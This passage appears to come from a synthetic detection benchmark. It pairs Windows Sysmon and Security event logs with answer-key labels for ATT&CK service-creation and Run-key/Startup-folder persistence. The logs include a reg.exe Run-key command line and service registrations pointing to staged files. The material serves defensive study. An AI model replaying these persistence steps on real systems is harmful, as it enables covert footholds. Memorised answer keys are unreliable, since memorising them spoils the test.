      "ProcessId": 78404,
      "TargetFilename": "C:\\ProgramData\\pine_elm_holly_243198\\service.dll",
      "User": "wlee",
      "UtcTime": "2026-03-17T17:29:32Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-17T17:29:32Z",
    "windows_event_id": 11
  },
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_07f5f9a1",
    "event_record_id": 246678825601726,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k pine_elm_holly_243198 -s Update_pine_elm_holly_243198 ServiceDll=C:\\ProgramData\\pine_elm_holly_243198\\service.dll",
      "ServiceName": "Update_pine_elm_holly_243198",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "EXCH01",
      "SubjectLogonId": "0x13241",
      "SubjectUserName": "wlee",
      "TimeCreated": "2026-03-17T17:29:35Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-17T17:29:35Z",
    "windows_event_id": 4697
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_6aebb447",
    "event_record_id": 182274118447705,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\svchost.exe -k pine_elm_holly_243198 -s Update_pine_elm_holly_243198 ServiceDll=C:\\ProgramData\\pine_elm_holly_243198\\service.dll",
      "Computer": "EXCH01",
      "EventID": 1,
      "Hashes": "SHA256=3201a28fcf51c575d238c6bbf716cde4bc74ad37b3eaf48c8adbca15f081233e",
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "LogonGuid": "{1795d960-a112-3e87-391e-449fe75fd1bf}",
      "LogonId": "0x13241",
      "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
      "ParentImage": "C:\\Windows\\System32\\services.exe",
      "ParentProcessGuid": "{f08915e2-78d1-7f03-573a-08129a8aae59}",
      "ParentProcessId": 78396,
      "ProcessGuid": "{a5c70014-f259-def2-acd0-2555af3b74cd}",
      "ProcessId": 78408,
      "User": "SYSTEM",
      "UtcTime": "2026-03-17T17:29:38Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-17T17:29:38Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "ProcessGuid": "{c8f6cdcb-475b-9096-3e5e-21edd79fc9ae}",
    "ProcessId": 78404,
    "TargetFilename": "C:\\ProgramData\\pine_elm_holly_243198\\service.dll",
    "User": "wlee",
    "UtcTime": "2026-03-17T17:29:32Z"
  },
  {
    "Computer": "EXCH01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Windows\\System32\\svchost.exe -k pine_elm_holly_243198 -s Update_pine_elm_holly_243198 ServiceDll=C:\\ProgramData\\pine_elm_holly_243198\\service.dll",
    "ServiceName": "Update_pine_elm_holly_243198",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "EXCH01",
    "SubjectLogonId": "0x13241",
    "SubjectUserName": "wlee",
    "TimeCreated": "2026-03-17T17:29:35Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k pine_elm_holly_243198 -s Update_pine_elm_holly_243198 ServiceDll=C:\\ProgramData\\pine_elm_holly_243198\\service.dll",
    "Computer": "EXCH01",
    "EventID": 1,
    "Hashes": "SHA256=3201a28fcf51c575d238c6bbf716cde4bc74ad37b3eaf48c8adbca15f081233e",
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "LogonGuid": "{1795d960-a112-3e87-391e-449fe75fd1bf}",
    "LogonId": "0x13241",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentProcessGuid": "{f08915e2-78d1-7f03-573a-08129a8aae59}",
    "ParentProcessId": 78396,
    "ProcessGuid": "{a5c70014-f259-def2-acd0-2555af3b74cd}",
    "ProcessId": 78408,
    "User": "SYSTEM",
    "UtcTime": "2026-03-17T17:29:38Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1543_003_E/contextual",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_07f5f9a1",
        "fields": [
          "Computer",
          "ServiceFileName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_fd6f021e",
        "fields": [
          "TargetFilename"
        ]
      },
      {
        "event_id": "evt_6aebb447",
        "fields": [
          "Computer",
          "Image",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DLL creation and later svchost process-creation record corroborate the configured service image path; they do not establish that the service loaded the staged image.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_4e5ed63b"
}
```

## pair_28321514
Family: TF_T1547_001_A; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_f0a4c050",
    "event_record_id": 10520680062516,
    "fields": {
      "Computer": "EXCH01",
      "Details": "C:\\Users\\Public\\alder_fir_cedar_283215\\agent.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "ProcessGuid": "{e015f359-c633-7fab-3fe2-640a3e525a92}",
      "ProcessId": 79096,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-16152\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\alder_fir_cedar_283215",
      "User": "admin.svc",
      "UtcTime": "2026-05-06T12:31:41Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-06T12:31:41Z",
    "windows_event_id": 13
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "EXCH01",
    "Details": "C:\\Users\\Public\\alder_fir_cedar_283215\\agent.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\reg.exe",
    "ProcessGuid": "{e015f359-c633-7fab-3fe2-640a3e525a92}",
    "ProcessId": 79096,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-16152\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\alder_fir_cedar_283215",
    "User": "admin.svc",
    "UtcTime": "2026-05-06T12:31:41Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_A/single",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_f0a4c050",
        "fields": [
          "Details",
          "TargetObject"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The registry event directly records a Run-key persistence value pointing to a user-writable executable.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_41e73e4b"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_8b96341a",
    "event_record_id": 246384881681971,
    "fields": {
      "CommandLine": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v alder_fir_cedar_283215 /t REG_SZ /d \"C:\\Users\\Public\\alder_fir_cedar_283215\\agent.exe\" /f",
      "Computer": "EXCH01",
      "EventID": 1,
      "Hashes": "SHA256=95ce63da23671722a26e4a9e46f1c7a863812e703c36aa1ed8767502f8a1770e",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "LogonGuid": "{676e3541-e82f-2e46-ec26-ec23060fa248}",
      "LogonId": "0x134f5",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{4b246872-e682-a2f0-98d8-9fedd28be9cf}",
      "ParentProcessId": 79088,
      "ProcessGuid": "{e015f359-c633-7fab-3fe2-640a3e525a92}",
      "ProcessId": 79096,
      "User": "admin.svc",
      "UtcTime": "2026-05-06T12:31:38Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-06T12:31:38Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_f0a4c050",
    "event_record_id": 10520680062516,
    "fields": {
      "Computer": "EXCH01",
      "Details": "C:\\Users\\Public\\alder_fir_cedar_283215\\agent.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "ProcessGuid": "{e015f359-c633-7fab-3fe2-640a3e525a92}",
      "ProcessId": 79096,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-16152\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\alder_fir_cedar_283215",
      "User": "admin.svc",
      "UtcTime": "2026-05-06T12:31:41Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-06T12:31:41Z",
    "windows_event_id": 13
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v alder_fir_cedar_283215 /t REG_SZ /d \"C:\\Users\\Public\\alder_fir_cedar_283215\\agent.exe\" /f",
    "Computer": "EXCH01",
    "EventID": 1,
    "Hashes": "SHA256=95ce63da23671722a26e4a9e46f1c7a863812e703c36aa1ed8767502f8a1770e",
    "Image": "C:\\Windows\\System32\\reg.exe",
    "LogonGuid": "{676e3541-e82f-2e46-ec26-ec23060fa248}",
    "LogonId": "0x134f5",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{4b246872-e682-a2f0-98d8-9fedd28be9cf}",
    "ParentProcessId": 79088,
    "ProcessGuid": "{e015f359-c633-7fab-3fe2-640a3e525a92}",
    "ProcessId": 79096,
    "User": "admin.svc",
    "UtcTime": "2026-05-06T12:31:38Z"
  },
  {
    "Computer": "EXCH01",
    "Details": "C:\\Users\\Public\\alder_fir_cedar_283215\\agent.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\reg.exe",
    "ProcessGuid": "{e015f359-c633-7fab-3fe2-640a3e525a92}",
    "ProcessId": 79096,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-16152\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\alder_fir_cedar_283215",
    "User": "admin.svc",
    "UtcTime": "2026-05-06T12:31:41Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_A/contextual",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_f0a4c050",
        "fields": [
          "Computer",
          "Details",
          "ProcessGuid",
          "TargetObject",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_8b96341a",
        "fields": [
          "Computer",
          "Image",
          "ProcessGuid",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The reg.exe writer event confirms the Run-key mutation and its persistence target.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_ab529d9c"
}
```

## pair_0f44b99e
Family: TF_T1547_001_B; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_19362207",
    "event_record_id": 145203347620553,
    "fields": {
      "Computer": "DB01",
      "EventID": 11,
      "Image": "C:\\Windows\\explorer.exe",
      "ProcessGuid": "{840fc9f4-82c9-3f4a-b20e-4d103e62d529}",
      "ProcessId": 10568,
      "TargetFilename": "C:\\Users\\wlee\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pine_yew_birch_0f44b9.lnk",
      "User": "wlee",
      "UtcTime": "2026-05-04T00:49:24Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-04T00:49:24Z",
    "windows_event_id": 11
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 11,
    "Image": "C:\\Windows\\explorer.exe",
    "ProcessGuid": "{840fc9f4-82c9-3f4a-b20e-4d103e62d529}",
    "ProcessId": 10568,
    "TargetFilename": "C:\\Users\\wlee\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pine_yew_birch_0f44b9.lnk",
    "User": "wlee",
    "UtcTime": "2026-05-04T00:49:24Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_B/single",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_19362207",
        "fields": [
          "Image",
          "TargetFilename"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The file-create event records a shortcut placed in the per-user Startup folder, a direct persistence location.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_d413ad03"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_19362207",
    "event_record_id": 145203347620553,
    "fields": {
      "Computer": "DB01",
      "EventID": 11,
      "Image": "C:\\Windows\\explorer.exe",
      "ProcessGuid": "{840fc9f4-82c9-3f4a-b20e-4d103e62d529}",
      "ProcessId": 10568,
      "TargetFilename": "C:\\Users\\wlee\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pine_yew_birch_0f44b9.lnk",
      "User": "wlee",
      "UtcTime": "2026-05-04T00:49:24Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-04T00:49:24Z",
    "windows_event_id": 11
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_a932f5d2",
    "event_record_id": 159229418913787,
    "fields": {
      "CommandLine": "C:\\Windows\\explorer.exe",
      "Computer": "DB01",
      "EventID": 1,
      "Hashes": "SHA256=4cee57f2a02b5c6790b139772ca124606d08e477c2a669b768c5511d08f9b801",
      "Image": "C:\\Windows\\explorer.exe",
      "LogonGuid": "{81cdd438-c297-e4b1-b9ba-b9d06b8ed48f}",
      "LogonId": "0x2949",
      "ParentCommandLine": "C:\\Windows\\System32\\userinit.exe",
      "ParentImage": "C:\\Windows\\System32\\userinit.exe",
      "ParentProcessGuid": "{c99ac99c-4fd7-79fa-4f93-b98051c06018}",
      "ParentProcessId": 10564,
      "ProcessGuid": "{90d17cf3-bffb-7869-8bd4-c6aa5a9dadee}",
      "ProcessId": 10572,
      "User": "wlee",
      "UtcTime": "2026-05-04T00:49:27Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-04T00:49:27Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 11,
    "Image": "C:\\Windows\\explorer.exe",
    "ProcessGuid": "{840fc9f4-82c9-3f4a-b20e-4d103e62d529}",
    "ProcessId": 10568,
    "TargetFilename": "C:\\Users\\wlee\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pine_yew_birch_0f44b9.lnk",
    "User": "wlee",
    "UtcTime": "2026-05-04T00:49:24Z"
  },
  {
    "CommandLine": "C:\\Windows\\explorer.exe",
    "Computer": "DB01",
    "EventID": 1,
    "Hashes": "SHA256=4cee57f2a02b5c6790b139772ca124606d08e477c2a669b768c5511d08f9b801",
    "Image": "C:\\Windows\\explorer.exe",
    "LogonGuid": "{81cdd438-c297-e4b1-b9ba-b9d06b8ed48f}",
    "LogonId": "0x2949",
    "ParentCommandLine": "C:\\Windows\\System32\\userinit.exe",
    "ParentImage": "C:\\Windows\\System32\\userinit.exe",
    "ParentProcessGuid": "{c99ac99c-4fd7-79fa-4f93-b98051c06018}",
    "ParentProcessId": 10564,
    "ProcessGuid": "{90d17cf3-bffb-7869-8bd4-c6aa5a9dadee}",
    "ProcessId": 10572,
    "User": "wlee",
    "UtcTime": "2026-05-04T00:49:27Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_B/contextual",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_19362207",
        "fields": [
          "TargetFilename",
          "User"
        ]
      },
      {
        "event_id": "evt_a932f5d2",
        "fields": [
          "Image",
          "User"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "A related explorer.exe event for the same user confirms the Startup-folder artifact is in the user startup path.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_a660fdc8"
}
```

## pair_06013fc7
Family: TF_T1547_001_C; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_b350ad97",
    "event_record_id": 193134504947930,
    "fields": {
      "Computer": "WEB01",
      "Details": "C:\\Users\\Public\\oak_holly_ash_06013f\\run.ps1",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ProcessGuid": "{afa7a18f-b0da-9684-33f4-0e6c68a2640f}",
      "ProcessId": 44856,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\oak_holly_ash_06013f",
      "User": "jsmith",
      "UtcTime": "2026-03-30T22:17:55Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-30T22:17:55Z",
    "windows_event_id": 13
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WEB01",
    "Details": "C:\\Users\\Public\\oak_holly_ash_06013f\\run.ps1",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "{afa7a18f-b0da-9684-33f4-0e6c68a2640f}",
    "ProcessId": 44856,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\oak_holly_ash_06013f",
    "User": "jsmith",
    "UtcTime": "2026-03-30T22:17:55Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_C/single",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_b350ad97",
        "fields": [
          "Details",
          "Image",
          "TargetObject"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The registry event records PowerShell creating a RunOnce persistence value with a user-writable script target.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_b6e5341d"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_39b4582c",
    "event_record_id": 112163570013824,
    "fields": {
      "Computer": "WEB01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ProcessGuid": "{afa7a18f-b0da-9684-33f4-0e6c68a2640f}",
      "ProcessId": 44856,
      "TargetFilename": "C:\\Users\\Public\\oak_holly_ash_06013f\\run.ps1",
      "User": "jsmith",
      "UtcTime": "2026-03-30T22:17:52Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-30T22:17:52Z",
    "windows_event_id": 11
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_b350ad97",
    "event_record_id": 193134504947930,
    "fields": {
      "Computer": "WEB01",
      "Details": "C:\\Users\\Public\\oak_holly_ash_06013f\\run.ps1",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ProcessGuid": "{afa7a18f-b0da-9684-33f4-0e6c68a2640f}",
      "ProcessId": 44856,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\oak_holly_ash_06013f",
      "User": "jsmith",
      "UtcTime": "2026-03-30T22:17:55Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-30T22:17:55Z",
    "windows_event_id": 13
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WEB01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "{afa7a18f-b0da-9684-33f4-0e6c68a2640f}",
    "ProcessId": 44856,
    "TargetFilename": "C:\\Users\\Public\\oak_holly_ash_06013f\\run.ps1",
    "User": "jsmith",
    "UtcTime": "2026-03-30T22:17:52Z"
  },
  {
    "Computer": "WEB01",
    "Details": "C:\\Users\\Public\\oak_holly_ash_06013f\\run.ps1",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "{afa7a18f-b0da-9684-33f4-0e6c68a2640f}",
    "ProcessId": 44856,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-19313\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\oak_holly_ash_06013f",
    "User": "jsmith",
    "UtcTime": "2026-03-30T22:17:55Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_C/contextual",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_b350ad97",
        "fields": [
          "Computer",
          "Details",
          "ProcessGuid",
          "TargetObject"
        ]
      },
      {
        "event_id": "evt_39b4582c",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The file event corroborates the script target used by the RunOnce value.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_37596316"
}
```

## pair_6633fc42
Family: TF_T1547_001_DEV; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_b9b0bc10",
    "event_record_id": 55475789057263,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 11,
      "Image": "C:\\ProgramData\\pine_cedar_maple_6633fc\\loginhelper.exe",
      "ProcessGuid": "{a5c6a295-1907-3d24-bdc3-0af157b23ade}",
      "ProcessId": 58692,
      "TargetFilename": "C:\\Users\\tjones\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pine_cedar_maple_6633fc.url",
      "User": "tjones",
      "UtcTime": "2026-03-04T02:15:33Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-04T02:15:33Z",
    "windows_event_id": 11
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "FILESVR01",
    "EventID": 11,
    "Image": "C:\\ProgramData\\pine_cedar_maple_6633fc\\loginhelper.exe",
    "ProcessGuid": "{a5c6a295-1907-3d24-bdc3-0af157b23ade}",
    "ProcessId": 58692,
    "TargetFilename": "C:\\Users\\tjones\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pine_cedar_maple_6633fc.url",
    "User": "tjones",
    "UtcTime": "2026-03-04T02:15:33Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_DEV/single",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_b9b0bc10",
        "fields": [
          "Image",
          "TargetFilename"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV-only startup-folder url shortcut created by a login helper has concrete technique-specific evidence in its anchor event.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_3092fc2c"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_79b1113d",
    "event_record_id": 182272549787911,
    "fields": {
      "CommandLine": "C:\\ProgramData\\pine_cedar_maple_6633fc\\loginhelper.exe /startup pine_cedar_maple_6633fc",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=d44f2dca4c46f078e7211db3bf190ef848d43a3d41e15b9e7df7744ec5f55267",
      "Image": "C:\\ProgramData\\pine_cedar_maple_6633fc\\loginhelper.exe",
      "LogonGuid": "{f3297828-5125-c6d6-47cf-66faf23acd89}",
      "LogonId": "0xe541",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{571e42f6-eadc-27d7-45e0-47b401c0a817}",
      "ParentProcessId": 58684,
      "ProcessGuid": "{a5c6a295-1907-3d24-bdc3-0af157b23ade}",
      "ProcessId": 58692,
      "User": "tjones",
      "UtcTime": "2026-03-04T02:15:30Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-04T02:15:30Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_b9b0bc10",
    "event_record_id": 55475789057263,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 11,
      "Image": "C:\\ProgramData\\pine_cedar_maple_6633fc\\loginhelper.exe",
      "ProcessGuid": "{a5c6a295-1907-3d24-bdc3-0af157b23ade}",
      "ProcessId": 58692,
      "TargetFilename": "C:\\Users\\tjones\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pine_cedar_maple_6633fc.url",
      "User": "tjones",
      "UtcTime": "2026-03-04T02:15:33Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-03-04T02:15:33Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\ProgramData\\pine_cedar_maple_6633fc\\loginhelper.exe /startup pine_cedar_maple_6633fc",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=d44f2dca4c46f078e7211db3bf190ef848d43a3d41e15b9e7df7744ec5f55267",
    "Image": "C:\\ProgramData\\pine_cedar_maple_6633fc\\loginhelper.exe",
    "LogonGuid": "{f3297828-5125-c6d6-47cf-66faf23acd89}",
    "LogonId": "0xe541",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{571e42f6-eadc-27d7-45e0-47b401c0a817}",
    "ParentProcessId": 58684,
    "ProcessGuid": "{a5c6a295-1907-3d24-bdc3-0af157b23ade}",
    "ProcessId": 58692,
    "User": "tjones",
    "UtcTime": "2026-03-04T02:15:30Z"
  },
  {
    "Computer": "FILESVR01",
    "EventID": 11,
    "Image": "C:\\ProgramData\\pine_cedar_maple_6633fc\\loginhelper.exe",
    "ProcessGuid": "{a5c6a295-1907-3d24-bdc3-0af157b23ade}",
    "ProcessId": 58692,
    "TargetFilename": "C:\\Users\\tjones\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pine_cedar_maple_6633fc.url",
    "User": "tjones",
    "UtcTime": "2026-03-04T02:15:33Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1547_001_DEV/contextual",
  "evidence_refs": {
    "T1547.001": [
      {
        "event_id": "evt_b9b0bc10",
        "fields": [
          "Computer",
          "Image",
          "TargetFilename"
        ]
      },
      {
        "event_id": "evt_79b1113d",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Context confirms the DEV-only startup-folder url shortcut created by a login helper behavior through a related telemetry event.",
  "technique_ids": [
    "T1547.001"
  ],
  "technique_names": [
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_ae31cf18"
}
```

## pair_1980c160
Family: TF_T1547_001_E; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_4cd659d0",
    "event_record_id": 95840973683252,
    "fields": {
      "Computer": "WORKSTATION01",
      "Details": "C:\\Users\\wlee\\AppData\\Local\\willow_elm_yew_1980c1\\helper.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "ProcessGuid": "{572ab730-fa34-ae22-4857-365b49fd8f61}",
